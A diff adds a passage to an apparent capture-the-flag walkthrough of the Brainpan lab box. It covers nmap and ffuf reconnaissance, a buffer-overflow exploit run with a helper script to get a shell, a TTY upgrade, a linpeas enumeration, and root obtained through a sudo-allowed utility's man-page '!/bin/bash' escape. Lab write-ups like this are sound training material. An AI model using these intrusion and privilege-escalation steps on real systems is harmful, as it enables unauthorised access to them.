@@ -868,10 +868,63 @@ Scan the box:
 	10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
 
  Fingerprint the services:
+
+ 	nmap 10.10.189.107 -sVC -Pn -O -p 9999,10000
  
-	
+	PORT      STATE SERVICE VERSION
+	9999/tcp  open  abyss?
+	| fingerprint-strings: 
+	|   NULL: 
+	|     _| _| 
+	|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+	|     _|_| _| _| _| _| _| _| _| _| _| _| _|
+	|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+	|     [________________________ WELCOME TO BRAINPAN _________________________]
+	|_    ENTER THE PASSWORD
+ 
+	10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+	|_http-title: Site doesn't have a title (text/html).
+	|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
+We have a custom service and HTTP Python Simple server (are you practicing safe-coding).
+Perform directory discovery on the web server:
 
-	
+	ffuf -u http://10.10.189.107:10000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301
+	...
+ 	bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
+	...
+ Visiting the directory we can download the brainpan.exe, that is the service running on port 9999.
+ The service can be crashed passing a string of 1000 characters, so let's try the usual BOF analysis locally. Even in this case BOF-Assistant help us to quickly find the exploit path.
+ Then we can replicated remotely using the direct exploit mode. Just remember this is a Linux box, so choose the appropriate shell payload:
 
-	
+ 	python3 BOF-Assistant.py  <brainpan IP> 9999 -e
 
+ Then upgrade the shell to TTY
+
+ 	python -c 'import pty; pty.spawn("/bin/bash")'
+
+Get linpeas from the attacker machine and run it:
+
+ 	╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+	...
+	
+	User puck may run the following commands on this host:
+	    (root) NOPASSWD: /home/anansi/bin/anansi_util
+
+Let's run the command:
+
+	sudo /home/anansi/bin/anansi_util
+	Usage: /home/anansi/bin/anansi_util [action]
+	Where [action] is one of:
+	  - network
+	  - proclist
+	  - manual [command]
+Then we can execute the following (use which command you prefer for manual)
+
+	sudo /home/anansi/bin/anansi_util manual cat
+ Then we get a shell issuing: <b>!/bin/bash after RETURN)</b>
+
+ 	No manual entry for manual
+	WARNING: terminal is not fully functional
+	-  (press RETURN)!/bin/bash
+	!/bin/bash
+	root@brainpan:/usr/share/man# 
